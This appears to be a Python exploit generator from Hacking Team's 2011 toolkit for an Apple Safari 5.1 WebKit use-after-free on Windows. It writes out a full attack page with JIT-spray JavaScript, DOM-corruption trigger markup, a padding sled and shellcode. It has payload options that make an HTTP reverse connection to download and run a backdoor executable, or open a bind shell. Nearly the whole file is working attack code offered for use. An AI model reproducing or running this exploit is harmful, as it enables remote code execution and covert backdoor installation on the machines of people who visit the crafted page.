#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# Apple Safari iFrame vulnerability
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode
import jitencoder

NAME="safari_51_webkit"
DESCRIPTION="Apple Safari WEBKIT Use-after-free Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Apple"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/??-??"
DOCUMENTATION["CVE Name"] = "CVE-2011-????"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-????"
DOCUMENTATION["Note"] = """Multiple memory corruption issues existed in WebKit. 
Visiting a maliciously crafted website may lead to an unexpected application termination or arbitrary code execution."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, outputFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputFile = outputFile
		self.backdoorPath = backdoorPath

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Apple Safari 5.1", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

		return value
		
	def get_root_index_content(self):
		value = u"""
<html>

    <head>
        <!-- Shellcode bindshell 4444 -->
        <script type="text/javascript">
            var F =
            "{" +
            "var a0001 = 8.901683143332028e-290;" + "var a0002 = 8.658897914165189e-290;" +
            "var a0003 = 8.779128443857745e-290;" + "var a0004 = 1.8632379526016944e-307;" +
            "var a0005 = 49191.39110400403;" + "var a0006 = 8.968185844085457e+32;" +
            "var a0007 = 9.671406564384731e+26;" + "var a0008 = 559274374538047.75;" +
            "var a0009 = -3.9507634461533883e+64;" + "var a0010 = -4.110389779191713e-228;" +
            "var a0011 = -1.5831608169670814e+195;" + "var a0012 = 210.556219051517;" +
            "var a0013 = 1.796947207076471e+106;" + "var a0014 = 8.919021209298104e+238;" +
            "var a0015 = -3.791274780141617e-255;" + "var a0016 = 2.394738104973476e+184;" +
            "var a0017 = -2.816971786432705e+18;" + "var a0018 = 2.3357332921077297e-18;" +
            "var a0019 = 1.3016523711885937e+51;" + "var a0020 = 6.480713458903093e-54;" +
            "var a0021 = -5.474352306851368e+304;" + "var a0022 = 9.590128092893295e-273;" +
            "var a0023 = 7.088565679977854e-20;" + "var a0024 = 1.4609243052404269e-133;" +
            "var a0025 = 1.4780257430624045e+128;" + "var a0026 = -2.953260422373511e+24;" +
            "var a0027 = -6.91035318193673e-229;";

            var S="";
            for (var i=1;i<10000;i++)
            {
                S += "function fct_" + i + "()" + F + "return a0010; }" + " fct_" + i + "();";
            }
            eval(S);
        </script>
        
    
        <script type="text/javascript">
            
            var $ = function(id) { return document.getElementById(id); }
            var deleteNode = function(id) { var i = $(id); i.parentNode.removeChild(i); }
            
            window.onload = function()
            {
                var eip = 0x070701e1;
                $("eip").setAttribute("width", eip.toString() + "px");
                $("eip").setAttribute("height", eip.toString() + "px");
                
                deleteNode(1);
                deleteNode(2);
                document.write();
            }

        </script>

    </head>

    <body>
        <ruby id="3">
            <s>
                <rt></rt>
                <table id="2">
                    <p id="1"><wbr><canvas id="eip"></canvas></p>AAAA
                </table>
            </s>
        </ruby>
    </body>

</html>


<div style="display: none;">
"""

		#adapter = jitencoder.jitencoder()
		padding = ""
		padding += "\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90"
		padding += "\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41"
		padding += "\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90"
		padding += "\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41"
		padding += "\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90"
		padding += "\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41"
		padding += "\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90"
		padding += "\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41\x90\x41"
		padding += "\x90\x41\x90\x41\x90\x41\x90\x41\x90\x89\xE0\x66\x0D\xFF\xFF\x24\xFC\x89\x20\xFC"
		
		shellcode = padding + self.createShellcode()
		#shellcode = adapter.get2(shellcode, 7, "0x085A00EC^")
		
		value = value.encode("utf-16")
	
		html = value + shellcode
		return html


	def makefile(self):
	
		html_index = self.get_root_index_content()
		#html_svg = self.get_target_svg()
		
		#html_index6 = self.get_index6()
		#html_index8 = self.get_index8()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			#tmp_targetsvg = os.tempnam()
			#tmp_index6 = os.tempnam()
			#tmp_backdoor = os.tempnam()
		
		print "Creating %s file"%(self.outputFile)
		f = open(self.outputFile,mode='wb')
		f.write(html_index)
		f.close()
				
		#f = open(tmp_index6,mode='wb')
		#f.write(html_index6)
		#f.close()
		
		#f = open(tmp_index8,mode='wb')
		#f.write(html_index8)
		#f.close()
		
		# Create the output archive
		
		
		return 0


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
			#if len(sys.argv) > 3:
			#	extraPath = sys.argv[4]
			#else:
			#	extraPath = None
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'
	